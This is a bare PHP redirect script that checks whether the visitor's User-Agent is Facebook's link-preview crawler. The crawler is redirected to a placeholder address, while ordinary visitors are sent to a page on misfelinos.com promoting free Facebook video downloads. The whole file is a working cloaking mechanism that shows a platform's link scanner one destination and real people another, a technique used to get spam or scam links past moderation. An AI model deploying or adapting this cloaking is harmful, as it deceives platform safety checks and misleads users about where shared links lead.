<?php
$agent = $_SERVER['HTTP_USER_AGENT'];
$agent = trim($agent);
$agent = strtolower($agent);
if (
strpos($agent,'facebookexternalhit/1.1')===0
|| strpos($agent,'facebookexternalhit/1.0')===0
){    header("HTTP/1.1 301 Moved Permanently");
header("Location:  http://VIDEOSS.XXXX"); }else{
    header("HTTP/1.1 301 Moved Permanently");
header("Location: https://misfelinos.com/free-download-of-online-videos-from-facebook/");
}
?>